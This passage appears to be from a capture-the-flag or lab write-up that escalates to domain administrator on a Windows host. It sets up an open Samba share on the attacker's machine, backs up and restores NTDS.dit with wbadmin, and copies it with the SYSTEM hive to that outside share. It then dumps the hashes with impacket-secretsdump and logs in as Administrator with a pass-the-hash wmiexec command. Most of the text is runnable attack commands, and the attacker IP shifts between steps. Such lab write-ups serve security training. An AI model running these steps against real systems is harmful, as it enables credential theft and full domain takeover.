Modify the contents of` /etc/samba/smb.conf` to the following:
```
[global]
map to guest = Bad User
server role = standalone server
usershare allow guests = yes
idmap config * : backend = tdb
interfaces = tun0
smb ports = 445
[smb]
comment = Samba
path = /tmp/
guest ok = yes
read only = no
browsable = yes
force user = smbuser
```

Create a new user that matches the user in the force user parameter.
```bash
adduser smbuser
```
Next, create a password for our newly created user.
```bash
smbpasswd -a smbuser
```

Then start the SMB demon with `sudo service smbd restart` . In our Win-Rm session we can mount the share:
```powershell
net use k: \\10.10.16.29\smb /user:smbuser smbuser
```

On the Win-Rm shell, we can backup the NTDS folder with wbadmin.
```powershell
echo "Y" | wbadmin start backup -backuptarget:\\10.10.16.29\smb -include:c:\windows\ntds
```

Next, retrieve the version of the backup.
```powershell
wbadmin get versions
```
We can now restore the NTDS.dit file, specifying the backup version.
```powershell
echo "Y" | wbadmin start recovery -version:10/11/2024-16:35 -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
```

We need to export the system hive too, and transfer both this and the NTDS.dit to our local
machine
```bash
reg save HKLM\SYSTEM C:\system.hive
```

Transfer over both NTDS.dit & system.hive file, and extract Administrator's LM hash using `impacket-secretsdump`

```bash
cp ntds.dit \\10.10.14.3\smb\NTDS.dit
cp system.hive \\10.10.14.3\smb\system.hive
```
```bash
impacket-secretsdump -ntds NTDS.dit -system system.hive LOCAL
```

Use wmiexec to log in as Administrator
```bash
impacket-wmiexec -hashes ':184fb5e5178480be64824d4cd53b99ee' Administrator@10.10.10.192
```

